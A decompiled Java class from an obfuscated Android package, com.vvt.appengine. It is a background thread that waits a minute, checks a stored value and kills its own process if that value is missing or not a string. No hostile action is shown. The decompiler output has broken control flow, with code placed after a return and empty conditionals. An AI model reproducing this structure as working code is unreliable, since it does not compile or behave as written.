package com.vvt.appengine;

import android.os.Process;
import android.os.SystemClock;

class m
  extends Thread
{
  m(l paraml) {}
  
  public void run()
  {
    long l = 60000L;
    SystemClock.sleep(l);
    Object localObject = l.a(this.a);
    if (localObject == null)
    {
      boolean bool1 = l.c();
      if (bool1) {}
      int i = Process.myPid();
      Process.killProcess(i);
    }
    for (;;)
    {
      return;
      localObject = l.a(this.a);
      boolean bool2 = localObject instanceof String;
      if (!bool2)
      {
        bool2 = l.c();
        if (bool2) {}
        int j = Process.myPid();
        Process.killProcess(j);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */